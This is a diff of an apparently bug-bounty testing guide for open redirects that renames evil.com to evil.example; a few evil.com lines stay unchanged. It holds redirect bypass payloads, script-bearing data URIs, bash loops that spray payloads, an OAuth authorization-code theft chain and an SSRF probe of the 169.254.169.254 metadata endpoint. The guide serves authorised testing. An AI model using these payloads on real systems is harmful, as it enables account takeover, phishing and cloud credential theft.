@@ -13,7 +13,7 @@ Open redirect alone is Low. Chained to OAuth = Critical (ATO).
 
 **Highest-value chains:**
 - **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
-- **Open redirect → phishing** — users trust the URL because it starts with target.com
+- **Open redirect → phishing** — users trust the URL because it starts with target.example
 - **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
 - **Open redirect → session fixation** — force user to login endpoint with pre-set session
 
@@ -51,18 +51,18 @@ Open redirect alone is Low. Chained to OAuth = Critical (ATO).
 
 | Technique | Payload |
 |-----------|---------|
-| Basic | `https://evil.com` |
-| Protocol relative | `//evil.com` |
-| Backslash bypass | `/\\evil.com` |
-| At-sign confusion | `https://target.com@evil.com` |
-| Double slash | `//evil.com/%2F..` |
+| Basic | `https://evil.example` |
+| Protocol relative | `//evil.example` |
+| Backslash bypass | `/\\evil.example` |
+| At-sign confusion | `https://target.example@evil.example` |
+| Double slash | `//evil.example/%2F..` |
 | URL encoding | `%2Fevil.com` |
-| Null byte | `evil.com%00target.com` |
-| Whitespace | `evil.com%09` or `%20` |
-| JavaScript URI | `javascript:window.location='https://evil.com'` |
-| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
-| Subdomain | `https://target.com.evil.com` |
-| Fragment | `https://evil.com#.target.com` |
+| Null byte | `evil.example%00target.com` |
+| Whitespace | `evil.example%09` or `%20` |
+| JavaScript URI | `javascript:window.location='https://evil.example'` |
+| Data URI | `data:text/html,<script>window.location='https://evil.example'</script>` |
+| Subdomain | `https://target.example.evil.example` |
+| Fragment | `https://evil.example#.target.example` |
 
 ---
 
@@ -81,7 +81,7 @@ grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|log
 
 ### Phase 2 — Basic Test
 ```bash
-COLLAB="https://evil.com"
+COLLAB="https://evil.example"
 cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
   LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
   STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
@@ -93,12 +93,12 @@ done
 ```bash
 BASE_URL="https://$TARGET/redirect?url="
 PAYLOADS=(
-  "https://evil.com"
-  "//evil.com"
-  "/\\evil.com"
-  "https://$TARGET@evil.com"
-  "https://evil.com%23.$TARGET"
-  "https://evil.com%09"
+  "https://evil.example"
+  "//evil.example"
+  "/\\evil.example"
+  "https://$TARGET@evil.example"
+  "https://evil.example%23.$TARGET"
+  "https://evil.example%09"
 )
 for P in "${PAYLOADS[@]}"; do
   LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
@@ -111,7 +111,7 @@ Server-side `Location:` grepping misses redirects that happen purely in JS. Sour
 ```bash
 grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
   | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
-# Confirm in a browser (curl can't): open  https://$TARGET/page#https://evil.com  (or ?url=...)
+# Confirm in a browser (curl can't): open  https://$TARGET/page#https://evil.example  (or ?url=...)
 # Common shape:  var u=new URLSearchParams(location.search).get('url'); location=u;
 ```
 (PortSwigger: DOM-based open redirection.)
@@ -122,8 +122,8 @@ grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$
 grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20
 
 # Construct OAuth URL with open redirect as redirect_uri
-# Normal: redirect_uri=https://target.com/callback
-# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
+# Normal: redirect_uri=https://target.example/callback
+# Attack: redirect_uri=https://target.example/redirect?url=https://evil.example
 OAUTH_URL="https://$TARGET/oauth/authorize"
 curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
 ```
@@ -131,7 +131,7 @@ curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https:/
 ### Phase 5 — Server-Side Redirect (SSRF escalation)
 ```bash
 # If the app fetches the redirect target server-side (302 fetch follow)
-curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"
+curl -s "https://$TARGET/proxy?url=https://evil.example/redirect-to-169.254.169.254/latest/meta-data/"
 
 # Or: if app makes HTTP request to the redirect destination
 curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
@@ -144,13 +144,13 @@ curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
 ```bash
 # openredirex
 pip3 install openredirex
-openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com
+openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.example
 
 # nuclei
 nuclei -u https://$TARGET -t redirect/ -severity medium,high
 
 # gf + qsreplace
-cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
+cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.example" | \
   xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
 ```
 
@@ -169,7 +169,7 @@ cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
 
 ## Validation
 
-✅ Location header in response points to evil.com (your controlled domain)
+✅ Location header in response points to evil.example (your controlled domain)
 ✅ Browser follows redirect to attacker-controlled page
 
 **Severity:**
